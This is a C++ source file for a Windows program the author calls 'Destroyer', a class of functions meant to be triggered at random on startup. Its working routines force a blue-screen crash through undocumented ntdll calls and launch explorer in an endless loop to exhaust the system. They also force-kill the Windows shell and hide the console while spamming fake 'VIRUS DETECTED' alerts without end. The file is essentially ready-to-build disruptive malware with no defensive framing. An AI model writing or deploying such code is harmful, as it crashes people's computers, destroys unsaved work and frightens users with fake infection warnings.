#include <iostream>
#include <stdlib.h>
#include <windows.h>

/**Making an object "Destroyer", which will contain all the necessary functions. I think we should make 
 * it so that a random malicious function is called upon startup 
**/ 
//functions should be called randomly
//everything should not be executed at startup
class Destroyer{
    public:
        void bsod()//BSODs the computer
        {
            int errCode=0xc0000022;
            HMODULE ntdll = LoadLibraryA("ntdll");
	        FARPROC RtlAdjustPrivilege = GetProcAddress(ntdll, "RtlAdjustPrivilege");
	        FARPROC NtRaiseHardError = GetProcAddress(ntdll, "NtRaiseHardError");

	        if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		        BOOLEAN tmp1; DWORD tmp2;
		        ((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		        ((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(errCode, 0, 0, 0, 6, &tmp2);
	        }
        }

        void overflow()//Opens explorer infinite times crashing the system 
        {
            while (true)
            {
                system("explorer");
                //std :: cout << "Normally ur pc would be dead\n"; 
            }
        }

        void killUI() //ends explorer task, hence destroying the ui of windows 10
        {
            system("taskkill /IM explorer.exe /F");
            //std :: cout << "Your UI would disappear normally\n";
        }
        
        //I have removed the lag copy function because everyone would not have gcc installed

        void VirusMsgSpam()  //Spams message boxes with virus detected text
        {
            ShowWindow(GetConsoleWindow(), SW_HIDE); //Hides the console
	        while(true) 
            {
                //This function is a Windows API function....
		        MessageBox(NULL, "VIRUS DETECTED", "ERROR", MB_OK | MB_ICONERROR); //Message Box
            }
        }

};
